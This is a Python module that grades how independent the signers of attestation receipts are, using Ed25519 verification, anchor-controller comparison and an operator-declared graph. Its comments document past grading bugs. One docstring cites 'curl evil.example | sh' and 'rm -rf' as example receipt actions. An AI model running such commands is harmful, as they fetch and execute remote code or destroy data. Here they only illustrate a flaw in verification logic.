"""
Witness Independence Level computation.

Reads: the receipt (to locate a kid and to learn the subject it names), the
observed resolution, and an operator-declared operator graph. Emits a level plus
the rubric that produced it.

Never reads a level, an independence claim, or a trust assertion out of a receipt
payload. A receipt is written by the party being measured.
"""
import json
from typing import Dict, Any, List, Optional

from .evidence import Fact, Check, OBSERVED, DECLARED, ABSENT
from .resolve import find_embedded_key, controller_of, AnchorStore, _norm_host


def _jcs(o):
    return json.dumps(o, sort_keys=True, separators=(",", ":"), ensure_ascii=False).encode()


def _canonical_whole(receipt):
    """Whole envelope, signature removed, keys sorted recursively (RFC 8785 shape)."""
    r = {k: v for k, v in receipt.items() if k != "signature"}
    return _jcs(r)


def _canonical_payload(receipt):
    """Signed payload only."""
    return _jcs(receipt.get("payload"))


SIGNING_PROFILES = (
    ("whole-envelope-minus-signature", _canonical_whole),
    ("payload-only", _canonical_payload),
)


def _sig_bytes(sig):
    """Signatures appear in the field as hex or as base64url. Try both, report which."""
    import base64, binascii
    out = []
    if isinstance(sig, str):
        s = sig.strip()
        if len(s) == 128:
            try:
                out.append(("hex", bytes.fromhex(s)))
            except (ValueError, binascii.Error):
                pass
        try:
            out.append(("base64url", base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))))
        except Exception:
            pass
    return [(name, b) for name, b in out if len(b) == 64]


def verify_signature(receipt, public_key_hex, profile=None):
    """
    Ed25519 per RFC 8032 over the canonical bytes.

    A format adapter that knows what its format signs passes `profile` as a
    (name, callable) pair, and only that convention is tried. A verifier that
    guesses among conventions until one succeeds is a verifier that can be
    steered, so guessing is the fallback for unlabelled input rather than the
    default path. When no profile is given, the known conventions are tried and
    the one that matched is named in the evidence.
    """
    try:
        from nacl.signing import VerifyKey
        from nacl.exceptions import BadSignatureError
    except ImportError:
        return None, "pynacl not installed; signature not checked"
    if receipt.get("payload") is None:
        return False, "receipt carries no payload"
    cands = _sig_bytes(receipt.get("signature"))
    if not cands:
        return False, "signature field is absent, or is not 64 bytes in hex or base64url"
    vk = VerifyKey(bytes.fromhex(public_key_hex))
    profiles = [profile] if profile else list(SIGNING_PROFILES)
    tried = []
    for enc, sig in cands:
        for pname, fn in profiles:
            try:
                vk.verify(fn(receipt), sig)
                return True, (f"Ed25519 RFC 8032, signature encoded as {enc}, "
                              f"canonical scope {pname}, RFC 8785 key ordering")
            except BadSignatureError:
                tried.append(f"{enc}/{pname}")
            except Exception as exc:
                tried.append(f"{enc}/{pname} ({exc})")
    if profile:
        return False, (f"signature did not verify under the resolved key over the "
                       f"{profile[0]} bytes this format signs")
    return False, ("signature did not verify under the resolved key for any known "
                   "convention; tried " + ", ".join(tried))


W0, W1, W2, WU, W3, W4 = "W0", "W1", "W2", "W2?", "W3", "W4"

# Ordered weakest to strongest. W2? sits above W2 because the anchor is not the
# subject's, and below W3 because nothing has established that it is independent.
ORDER = [W0, W1, W2, WU, W3, W4]

LABELS = {
    W0: "unattested",
    W1: "self-anchored",
    W2: "operator-anchored",
    WU: "undetermined, not shown independent",
    W3: "independently anchored",
    W4: "corroborated",
}

# Fields an implementation might use to assert its own independence. The level
# must be identical whether or not these are present. Vector A4 tests this.
SELF_ASSERTED_INDEPENDENCE_FIELDS = (
    "independent", "independence", "witness_independence", "wil",
    "wil_level", "third_party", "attester_independent", "self_attested",
)


class OperatorGraph:
    """Operator-declared relationships. Never observable by a run."""

    def __init__(self, doc: Optional[Dict[str, Any]] = None):
        doc = doc or {}
        self.declared_by = doc.get("declared_by")
        # controller -> list of subject ids or subject controllers it operates
        self.operates: Dict[str, List[str]] = doc.get("operates", {})
        # Controllers affirmatively declared to have no operational relationship
        # to the named subjects. Independence has to be claimed by somebody; it
        # cannot be inferred from the graph staying silent about a controller.
        self.independent_of: Dict[str, List[str]] = doc.get("independent_of", {})
        # groups of controllers known to share a root of trust
        self.shared_roots: List[List[str]] = doc.get("shared_roots", [])

    def operates_subject(self, controller: str, subject_id: str,
                         subject_controller: Optional[str]) -> bool:
        targets = self.operates.get(controller, [])
        if subject_id in targets:
            return True
        if subject_controller and subject_controller in targets:
            return True
        return False

    def covers(self, controller: str, subject_id: str,
               subject_controller: Optional[str]) -> bool:
        """Does the graph say anything at all about this controller and subject?

        The docstring is the specification and the first line used to break it.
        `controller in self.operates` asks whether the controller is a KEY in
        the operator map, which is a fact about the map, not about this
        subject. A controller named anywhere, including with an empty list,
        was therefore covered for every subject in existence, and the level
        that followed reported that the witness "is affirmatively declared to
        have no operational relationship to the subject" when nobody had
        declared anything of the sort.

        That is presence read as a claim, and it is the reason a receipt whose
        signer was the subject could reach W4.

        Coverage now means the graph names THIS subject, on one side or the
        other. An operator entry that mentions the subject is coverage,
        because a declared operational relationship is a statement about them
        both. An empty entry is not, and neither is an entry about somebody
        else.
        """
        operated = self.operates.get(controller) or []
        if subject_id in operated:
            return True
        if subject_controller and subject_controller in operated:
            return True
        targets = self.independent_of.get(controller, [])
        return subject_id in targets or (bool(subject_controller)
                                         and subject_controller in targets)

    def root_of(self, controller: str) -> str:
        """Transitive closure over declared shared roots plus exact identity."""
        parent: Dict[str, str] = {}

        def find(x):
            parent.setdefault(x, x)
            while parent[x] != x:
                parent[x] = parent[parent[x]]
                x = parent[x]
            return x

        def union(a, b):
            ra, rb = find(a), find(b)
            if ra != rb:
                parent[rb] = ra

        for group in self.shared_roots:
            for other in group[1:]:
                union(group[0], other)
        return find(controller)


def subject_controller_of(subject_id: str) -> Optional[str]:
    """Derive the subject's controlling domain from its identifier, if it has one."""
    if not isinstance(subject_id, str):
        return None
    if subject_id.startswith("did:web:"):
        return controller_of(subject_id)
    if subject_id.startswith(("http://", "https://")):
        return controller_of(subject_id)
    return None


def extract_kid(receipt: Dict[str, Any]) -> Optional[str]:
    for path in (("kid",), ("payload", "kid"), ("header", "kid")):
        node = receipt
        for part in path:
            if not isinstance(node, dict):
                node = None
                break
            node = node.get(part)
        if isinstance(node, str):
            return node
    return None


def extract_subject(receipt: Dict[str, Any]) -> Optional[str]:
    """
    The party the receipt is ABOUT. Read from the receipt because there is
    nowhere else it could come from, and used only as a comparison target.
    """
    for path in (("subject",), ("payload", "subject"), ("payload", "agent_id"),
                 ("payload", "agent"), ("agent_id",), ("payload", "actor")):
        node = receipt
        for part in path:
            if not isinstance(node, dict):
                node = None
                break
            node = node.get(part)
        if isinstance(node, str):
            return node
        if isinstance(node, dict) and isinstance(node.get("id"), str):
            return node["id"]
    return None


_NO_ACTION = object()


def extract_action(receipt: Dict[str, Any]):
    """
    The action the receipt is ABOUT, as written. Returns _NO_ACTION when the
    receipt names none, which is distinct from naming a null one.

    Read from the receipt for the same reason the subject is: there is nowhere
    else it could come from. Used only as a comparison target between
    attestations, never as a source of conclusions about any one of them.
    """
    for path in (("payload", "action"), ("action",), ("payload", "action_ref"),
                 ("payload", "event"), ("payload", "operation")):
        node = receipt
        for part in path:
            if not isinstance(node, dict) or part not in node:
                node = _NO_ACTION
                break
            node = node[part]
        if node is not _NO_ACTION:
            return node
    return _NO_ACTION


def corroboration_key(receipt: Dict[str, Any]):
    """
    The identity of the event an attestation testifies about: the pair
    (subject, action), canonicalised so that two dicts written in different key
    orders are one key.

    Returns None when either half is missing. A receipt that names no action
    cannot be shown to be about the same action as anything else, and the
    honest consequence of that is exclusion from corroboration rather than a
    default that lets it join.

    Comparison here is exact, deliberately unlike the host comparison in C5.
    The two comparisons fail in opposite directions. In C5 a missed match
    means a self-anchored receipt is called independent, so that comparison
    normalises aggressively. Here a missed match means two attestations that
    were about one event are treated as two, which costs a level that was
    real but claims nothing that is not. A spurious match is the expensive
    error, so the strict comparison is the safe one.
    """
    subject = extract_subject(receipt)
    action = extract_action(receipt)
    if subject is None or action is _NO_ACTION:
        return None
    return _jcs([subject, action])


def find_self_asserted_independence(receipt: Dict[str, Any]) -> List[str]:
    found = []

    def walk(node, prefix=""):
        if isinstance(node, dict):
            for k, v in node.items():
                if k in SELF_ASSERTED_INDEPENDENCE_FIELDS:
                    found.append(f"{prefix}{k}")
                walk(v, f"{prefix}{k}.")
        elif isinstance(node, list):
            for i, item in enumerate(node):
                walk(item, f"{prefix}{i}.")

    walk(receipt)
    return found


def grade_one(receipt: Dict[str, Any], store: AnchorStore,
              graph: OperatorGraph, profile=None) -> Dict[str, Any]:
    """
    Grade a single attestation. Returns level plus the rubric.

    `profile` is an optional (name, callable) pair supplied by a format adapter
    that knows what bytes its format signs. See verify_signature.
    """
    checks: List[Check] = []

    # --- C1: is a verification key carried inside the envelope? -------------
    embedded = find_embedded_key(receipt)
    checks.append(Check(
        id="C1",
        question="Is a verification key transported inside the receipt envelope?",
        outcome=f"embedded key field {embedded!r} present" if embedded else "no embedded key field",
        reads=[Fact("receipt.body", embedded, OBSERVED if embedded else ABSENT,
                    "scanned every node of the receipt for the key field names the "
                    "ACTA draft enumerates")],
    ))

    # --- C2: where did the key actually resolve from? -----------------------
    kid = extract_kid(receipt)
    pubkey_hex, anchor_url, anchor_fact = store.resolve(kid) if kid else (
        None, None, Fact("E1_anchor_url", None, ABSENT, "receipt carries no kid"))
    checks.append(Check(
        id="C2",
        question="From where was the verification key actually retrieved?",
        outcome=anchor_url or "not retrievable from the configured trust set",
        reads=[Fact("receipt.kid", kid, OBSERVED if kid else ABSENT,
                    "read from the receipt, used only to locate a key, never to conclude"),
               anchor_fact],
    ))

    # A receipt whose key is only inside the envelope is W0 no matter what else
    # is true of it. The draft already forbids trusting such a key; this makes
    # the boundary a measured outcome rather than an assumption.
    if anchor_url is None:
        level = W0
        reason = ("no verification key resolved from any anchor outside the envelope"
                  if embedded else "no verification key resolved at all")
        return _result(level, reason, checks, kid, None, extract_subject(receipt), receipt)

    # --- C2b: does the signature verify under the key that actually resolved? -
    sig_ok, sig_how = verify_signature(receipt, pubkey_hex, profile)
    checks.append(Check(
        id="C2b",
        question="Does the signature verify under the key retrieved from that anchor?",
        outcome=("valid" if sig_ok else "INVALID") if sig_ok is not None
                else "not checked",
        reads=[Fact("E1_resolved_key", pubkey_hex, OBSERVED, sig_how)],
    ))
    # `is False` let None through, and None is what verify_signature returns
    # when it could not check at all, which on this machine is every run:
    # run.sh hardcodes python3 and pynacl is not installed for it. So a
    # receipt with a byte flipped signature graded W3 and the gate printed
    # CONFORMANT, having verified nothing.
    #
    # Unchecked is not verified. A level is a claim about what was
    # established, and nothing is established by a signature nobody read.
    # This is the failure the whole scale exists to describe, in the tool
    # that describes it.
    if sig_ok is not True:
        if sig_ok is False:
            return _result(W0, "the signature does not verify under the key that "
                               "resolved from the anchor, so nothing is attested",
                           checks, kid, None, extract_subject(receipt), receipt)
        return _result(W0, "the signature could not be checked at all (%s), so no "
                           "level is established. Unchecked is not verified; "
                           "install the signing library and run this again"
                           % (sig_how or "no verifier available"),
                       checks, kid, None, extract_subject(receipt), receipt)

    controller = controller_of(anchor_url)
    subject_id = extract_subject(receipt)
    subj_ctrl = subject_controller_of(subject_id) if subject_id else None

    checks.append(Check(
        id="C3",
        question="Who controls the location the key was retrieved from?",
        outcome=controller or "controller not derivable from the anchor location",
        reads=[Fact("E2_anchor_controller", controller, OBSERVED,
                    "derived from the anchor location the resolver actually fetched")],
    ))

    checks.append(Check(
        id="C4",
        question="Which party is this attestation about?",
        outcome=f"{subject_id} (controller {subj_ctrl})" if subject_id else "no subject named",
        reads=[Fact("E3_subject", subject_id, OBSERVED if subject_id else ABSENT,
                    "read from the receipt as the comparison target only"),
               Fact("E3_subject_controller", subj_ctrl,
                    OBSERVED if subj_ctrl else ABSENT,
                    "derived from the subject identifier's own method and authority")],
    ))

    # C4 recorded "no subject named" and then every check below it ran anyway,
    # so a receipt about nobody graded W3 independently anchored. Independence
    # is a relation between two parties. With one of them missing there is no
    # relation to measure, and a scale that returns its second highest level
    # for a question it cannot ask is worse than one that refuses.
    #
    # Every comparison downstream silently agreed: self_anchored is False
    # because None equals nothing, the operator graph covers nothing because
    # there is no subject to look up, and the absence of any relationship read
    # as the absence of a bad one. That is the indeterminate sink running
    # backwards, filing an unanswerable question as a clean answer.
    if not subject_id:
        return _result(W0, "the receipt names no subject, so there is no party "
                           "for the signer to be independent OF. Independence is "
                           "a relation and this receipt supplies only one side "
                           "of it",
                       checks, kid, anchor_url, None, receipt)

    # --- C5: self-anchored? --------------------------------------------------
    # subject_id is written by whoever wrote the receipt and compared raw. A
    # host is case insensitive and may carry a trailing root dot, so
    # platform.example, Platform.Example and platform.example. are one host
    # written three ways, and only the first was caught here. The level went
    # W1 to W3 on a capital letter, which is the whole scale answerable by
    # the party it is meant to measure.
    #
    # controller and subj_ctrl now arrive normalised from controller_of, so
    # only the direct subject_id comparison needs normalising here, and it
    # needs it most: that one is the raw field.
    self_anchored = bool(controller and (
        controller == subj_ctrl
        or controller == _norm_host(subject_id)))
    checks.append(Check(
        id="C5",
        question="Is the anchor controlled by the subject itself?",
        outcome="yes" if self_anchored else "no",
        reads=[Fact("E2_anchor_controller", controller, OBSERVED, "as C3"),
               Fact("E3_subject_controller", subj_ctrl,
                    OBSERVED if subj_ctrl else ABSENT, "as C4")],
    ))

    if self_anchored:
        level = W1
        reason = (f"the key was retrieved from {anchor_url}, controlled by the subject "
                  f"{subject_id}; the signer and the party signed about are the same")
    else:
        # --- C6: operator-anchored? requires a declared fact ----------------
        operated = bool(controller and subject_id and
                        graph.operates_subject(controller, subject_id, subj_ctrl))
        checks.append(Check(
            id="C6",
            question="Does the anchor's controller operate the subject?",
            outcome="yes, per operator declaration" if operated else
                    ("no such relationship declared" if graph.declared_by
                     else "no operator graph supplied"),
            reads=[Fact("D1_operates", operated, DECLARED,
                        "operation is a relationship in the world; no fetch establishes "
                        "it, so it is supplied by the operator and marked as such"),
                   Fact("D1_declared_by", graph.declared_by,
                        DECLARED if graph.declared_by else ABSENT,
                        "the party that supplied the operator graph")],
        ))
        covered = bool(controller and graph.covers(controller, subject_id, subj_ctrl))
        checks.append(Check(
            id="C6b",
            question="Does the operator graph say anything at all about this controller?",
            outcome="yes" if covered else "no; independence cannot be established from silence",
            reads=[Fact("D1_coverage", covered, DECLARED,
                        "whether some party has affirmatively stated a relationship, or "
                        "the absence of one, between this controller and this subject"),
                   Fact("D1_declared_by", graph.declared_by,
                        DECLARED if graph.declared_by else ABSENT,
                        "the party that supplied the operator graph")],
        ))
        if operated:
            level, reason = W2, (
                f"the anchor controller {controller} is declared to operate the subject "
                f"{subject_id}; the key is held separately but by an aligned party")
        elif covered:
            level, reason = W3, (
                f"the key was retrieved from {anchor_url}, controlled by {controller}, "
                f"which is affirmatively declared to have no operational relationship "
                f"to the subject")
        else:
            level, reason = WU, (
                f"the key was retrieved from {anchor_url}, controlled by {controller}, "
                f"which is not the subject; but nothing states whether that controller "
                f"operates the subject, and independence is not established by silence")

    return _result(level, reason, checks, kid, controller, subject_id, receipt)


def _result(level, reason, checks, kid, controller, subject_id, receipt):
    # --- C7: self-asserted independence must not move the level -------------
    asserted = find_self_asserted_independence(receipt)
    checks.append(Check(
        id="C7",
        question="Does the receipt assert its own independence, and was that assertion used?",
        outcome=(f"fields {asserted} present and ignored" if asserted
                 else "no self-asserted independence fields present"),
        reads=[Fact("receipt.body", asserted, OBSERVED if asserted else ABSENT,
                    "located for reporting only; the level above was computed without "
                    "reading any of them")],
    ))
    return {
        "level": level,
        "label": LABELS[level],
        "reason": reason,
        "kid": kid,
        "anchor_controller": controller,
        "subject": subject_id,
        "checks": [c.to_dict() for c in checks],
        "contains_declared_input": any(c.any_declared for c in checks),
    }


def grade_set(receipts: List[Dict[str, Any]], store: AnchorStore,
              graph: OperatorGraph, profile=None) -> Dict[str, Any]:
    """
    Grade a set of attestations over one action. W4 requires two or more W3
    attestations ABOUT THE SAME EVENT whose anchors do not share a root,
    computed as a transitive closure rather than by counting distinct kid
    values.

    The spec is explicit that the set is over one thing. Section 3 defines W4
    as "Two or more W3 attestations over the same action whose anchors do not
    share a controller," and section 4 lists E3 as "The subject identifier the
    receipt names, used only as the value to compare against."

    This function used to check only the second half of that sentence. Two W3
    attestations with distinct roots reached W4 whatever they were about, so a
    receipt denying `rm -rf` and an unrelated receipt allowing
    `curl evil.example | sh` were reported as corroborating each other at the
    top of the scale. They corroborate nothing. They are two separate facts,
    and calling two separate facts the strongest available assurance is the
    exact failure this scale was written to describe, committed by the tool
    that describes it.

    The event identity is the pair (subject, action), not the action alone.
    The spec's sentence names the action, but every level below W4 is a
    relation between an anchor controller and a SUBJECT: W3 means "neither is
    nor operates the subject." A W3 verdict is therefore only meaningful
    relative to one subject, and two W3s about two different subjects are two
    findings about two different relationships. The same shell command run by
    two different agents is two events, so the subject is part of what makes
    the action the same action.

    `decision` is compared and reported but deliberately does not gate the
    level. Section 7 is direct that WIL "does not measure whether an action
    was correct ... A W4 result from four corroborating witnesses who are all
    wrong is four wrong witnesses." Two witnesses that disagree about the
    verdict are still two independent witnesses to the same event, which is
    what this scale measures. A caller that cares about the disagreement can
    read it off C8b rather than have it silently folded into a number.

    When the attestations do not concern the same event, the result is the
    highest individual level, not W2? undetermined. W2? has a specific
    meaning: independence was not established. Here it was, per attestation,
    on the ordinary evidence. Reporting W2? would trade one false statement
    for another one and lose a true finding on the way. The correct answer is
    to decline the promotion and report exactly what was shown, which for two
    genuine W3 attestations about different events is W3.
    """
    graded = [grade_one(r, store, graph, profile) for r in receipts]
    independent = [(g, r) for g, r in zip(graded, receipts) if g["level"] == W3]

    # Root closure per event, so that corroboration is counted only among
    # attestations that testify about the same thing.
    events: Dict[Any, Dict[str, List[str]]] = {}
    unkeyed = 0
    for g, r in independent:
        key = corroboration_key(r)
        if key is None:
            unkeyed += 1
            continue
        c = g["anchor_controller"]
        if c:
            events.setdefault(key, {}).setdefault(graph.root_of(c), []).append(c)

    corroborating = {k: v for k, v in events.items() if len(v) >= 2}
    corroborated = bool(corroborating)

    # Reported for the whole set so the flat root count stays visible; it is
    # no longer what decides the level.
    all_roots: Dict[str, List[str]] = {}
    for g, _ in independent:
        c = g["anchor_controller"]
        if c:
            all_roots.setdefault(graph.root_of(c), []).append(c)

    subjects = sorted({s for s in (g["subject"] for g, _ in independent) if s})
    actions = [a for a in (extract_action(r) for _, r in independent)
               if a is not _NO_ACTION]
    decisions = sorted({d for d in ((r.get("payload") or {}).get("decision")
                                    for _, r in independent) if d})

    set_checks = [
        Check(
            id="C8",
            question=("Do two or more independent attestations ABOUT THE SAME EVENT "
                      "rest on distinct roots of trust?"),
            outcome=(f"{len(events)} distinct event(s) across {len(independent)} "
                     f"independent attestations; "
                     + (f"{len(corroborating)} event(s) carry two or more distinct roots"
                        if corroborated else
                        "no single event carries two or more distinct roots")
                     + (f"; {unkeyed} attestation(s) named no comparable subject and "
                        f"action and were excluded" if unkeyed else "")),
            reads=[Fact("E4_root_closure", [dict(v) for v in events.values()],
                        OBSERVED,
                        "transitive closure over anchor controllers, computed within "
                        "each event; two distinct kid values served by one controller "
                        "count as one witness"),
                   Fact("E4_roots_ignoring_event", all_roots, OBSERVED,
                        "the flat root count over the whole set, reported because it "
                        "used to be the whole test and is no longer sufficient"),
                   Fact("D1_shared_roots", graph.shared_roots,
                        DECLARED if graph.shared_roots else ABSENT,
                        "declared groupings of controllers that share a root")],
        ),
        Check(
            id="C8b",
            question="Do the independent attestations concern the same subject and action?",
            outcome=("yes" if len(events) == 1 and not unkeyed else
                     f"no; {len(events)} distinct (subject, action) pair(s)"
                     + (f" and {unkeyed} attestation(s) with no comparable pair"
                        if unkeyed else "")),
            reads=[Fact("E3_subjects", subjects, OBSERVED if subjects else ABSENT,
                        "the subjects the receipts name, compared against each other "
                        "only, exactly and without normalisation"),
                   Fact("E3_actions", actions, OBSERVED if actions else ABSENT,
                        "the actions the receipts name, compared as canonical bytes so "
                        "key order cannot split one action into two"),
                   Fact("E3_decisions", decisions, OBSERVED if decisions else ABSENT,
                        "recorded for the reader; a disagreement here is visible but "
                        "does not move the level, because WIL measures custody "
                        "distance and not whether a witness is right")],
        ),
    ]

    top = W4 if corroborated else (max((g["level"] for g in graded),
                                       key=ORDER.index, default=W0))
    return {
        "engine": "wil",
        "engine_version": "0.1.0",
        "set_level": top,
        "set_label": LABELS[top],
        "attestations": graded,
        "set_checks": [c.to_dict() for c in set_checks],
        "contains_declared_input": any(g["contains_declared_input"] for g in graded)
                                   or any(c.any_declared for c in set_checks),
    }
